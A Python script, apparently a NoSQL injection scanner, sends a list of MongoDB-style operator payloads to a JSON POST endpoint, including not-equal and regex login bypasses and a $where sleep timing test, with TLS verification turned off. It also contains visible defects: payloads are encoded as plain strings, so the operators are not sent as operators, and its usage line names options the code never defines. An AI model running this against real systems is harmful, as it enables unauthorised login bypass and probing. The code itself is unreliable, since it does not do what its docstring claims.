#!/usr/bin/env python
"""nosql_probe.py — NoSQL injection tester (NoSQLMap-style).

Tests NoSQL injection (MongoDB/CouchDB/Firebase) via JSON operator injection
($ne, $gt, $regex, $where, $exists) in JSON-bodied POST endpoints. The signal:
a response that differs from the benign baseline when an operator is injected
(boolean-based) or a timing delay from $where sleep-style operators.

Usage: python nosql_probe.py <url> [--param user] [--json-field username]
       [--auth-bypass] [--concurrency 4]
"""
import argparse, json, sys, time, urllib.request, urllib.error, ssl, concurrent.futures

PAYLOADS = [
    ("ne_bypass", '{"$ne": null}', "not-equal bypass (returns all docs)"),
    ("ne_empty", '{"$ne": ""}', "not-equal bypass (non-empty)"),
    ("gt_bypass", '{"$gt": ""}', "greater-than bypass"),
    ("regex_all", '{"$regex": ".*"}', "regex match-all"),
    ("exists_true", '{"$exists": true}', "exists true"),
    ("where_taut", '"1==1"', "$where tautology"),
    ("where_sleep", '"sleep(3000)"', "$where timing (3s delay)"),
    ("in_array", '{"$in": ["admin","root","user"]}', "$in operator"),
]

def test(url, param, payload_str, desc, ctx):
    body = json.dumps({param: payload_str if payload_str.startswith(("{", '"')) else payload_str}).encode()
    t0 = time.time()
    try:
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("User-Agent", "Mozilla/5.0"); req.add_header("Content-Type", "application/json")
        with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
            resp = r.read(20000).decode("utf-8", errors="replace"); dt = time.time() - t0
            return {"desc": desc, "payload": payload_str, "time_s": round(dt,2), "delayed": dt > 2.5,
                     "status": r.status, "resp_len": len(resp), "resp_snippet": resp[:150]}
    except urllib.error.HTTPError as e:
        dt = time.time() - t0
        try: resp = e.read(20000).decode("utf-8","replace")
        except: resp = ""
        return {"desc": desc, "payload": payload_str, "time_s": round(dt,2), "delayed": dt > 2.5, "status": e.code, "resp_len": len(resp)}
    except Exception as ex:
        dt = time.time() - t0
        return {"desc": desc, "payload": payload_str, "time_s": round(dt,2), "delayed": dt > 2.5, "error": str(ex)[:100]}

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="JSON POST endpoint (e.g. /api/login)")
    ap.add_argument("--param", default="username", help="JSON field to inject into")
    ap.add_argument("--concurrency", type=int, default=4)
    args = ap.parse_args()
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    # baseline (benign value)
    try:
        base = json.dumps({args.param: "redan_benign"}).encode()
        req = urllib.request.Request(args.url, data=base, method="POST", headers={"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})
        with urllib.request.urlopen(req, context=ctx, timeout=15) as r: baseline_len = len(r.read(20000)); baseline_status = r.status
    except urllib.error.HTTPError as e: baseline_len = 0; baseline_status = e.code
    except: baseline_len = 0; baseline_status = 0
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futures = {pool.submit(test, args.url, args.param, p[1], p[2], ctx): p[0] for p in PAYLOADS}
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result(); r["label"] = futures[fut]; r["baseline_len"] = baseline_len; r["baseline_status"] = baseline_status; results.append(r)
    results.sort(key=lambda x: x.get("time_s",0), reverse=True)
    confirmed = [r for r in results if r.get("delayed") or (r.get("status")==baseline_status and abs(r.get("resp_len",0)-baseline_len)>50)]
    print(json.dumps({"target": args.url, "param": args.param, "ok": True, "baseline_len": baseline_len, "baseline_status": baseline_status,
        "payloads_tested": len(results), "confirmed": len(confirmed),
        "verdict": "NoSQL INJECTION CONFIRMED" if confirmed else "no NoSQL injection signal",
        "results": results, "confirmed_details": confirmed,
        "note": "a >=2.5s delay = $where timing. A status-match with length delta >50 = boolean auth-bypass. Test on JSON POST endpoints."}, indent=2))

if __name__ == "__main__":
    main()
